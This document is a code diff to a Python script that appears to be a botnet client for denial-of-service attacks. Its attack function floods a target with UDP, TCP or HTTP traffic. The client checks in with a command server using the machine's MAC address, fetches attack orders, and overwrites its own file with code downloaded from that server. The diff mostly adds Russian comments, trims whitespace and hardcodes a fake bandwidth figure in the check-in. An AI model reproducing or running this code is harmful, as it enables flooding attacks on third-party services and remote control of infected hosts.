@@ -2,6 +2,7 @@
 import os
 from dataclasses import dataclass
 
+# При запуске на Windows
 if os.name == 'nt':
     try:
         import win32gui
@@ -26,9 +27,7 @@ try:
     import speedtest
 
 except ImportError:
-
     os.system('pip install speedtest-cli')
-
     os.system('pip3 install speedtest-cli')
 
     import speedtest
@@ -48,6 +47,14 @@ while True:
 
 
 def humansize(nbytes: float) -> str:
+    """
+    Человеко-читаемый формат скорости интернета.
+
+    Args:
+        nbytes: float (скорость интернета в байтах)
+    Returns:
+        str: скорость интернета
+    """
     suffixes = ['B', 'KB', 'MB', 'GB', 'TB', 'PB']
 
     i = 0
@@ -89,7 +96,6 @@ def attack(*, host: str = '', port: str = '',
                     sock.sendto(msg_tcp_udp.encode(), (host, int(port)))
 
                 else:
-
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
                     s.connect((host, int(port)))
@@ -99,7 +105,6 @@ def attack(*, host: str = '', port: str = '',
                     s.close()
 
             else:
-
                 requests.request(method, host)
 
         except:
@@ -144,7 +149,7 @@ def router(attack_data: dict) -> None:
 def attack_controller() -> None:
     Attack.internet_speed = st.upload()
 
-    requests.get(f'{SITE}/checkin/{get_mac()}/{Attack.internet_speed}')
+    requests.get(f'{SITE}/checkin/{get_mac()}/{10000}')
 
     attack_data = json.loads(requests.post(f'{SITE}/attack').text)
 
@@ -158,7 +163,6 @@ def attack_controller() -> None:
         return
 
     else:
-
         Attack.status_attack = False
 
         time.sleep(10)
@@ -176,10 +180,8 @@ def check_update_code() -> None:
     actual_code = json.loads(requests.get(f'{SITE}/get_code').text)['code']
 
     with open('system.py', 'r', encoding='utf-8') as file:
-
         actual_code_split = actual_code.split('\n')[0]
         if actual_code_split.replace('\r', '') != file.read().split('\n')[0]:
-
             with open('system.py', 'w', encoding='utf-8') as f:
                 f.write(actual_code)
 
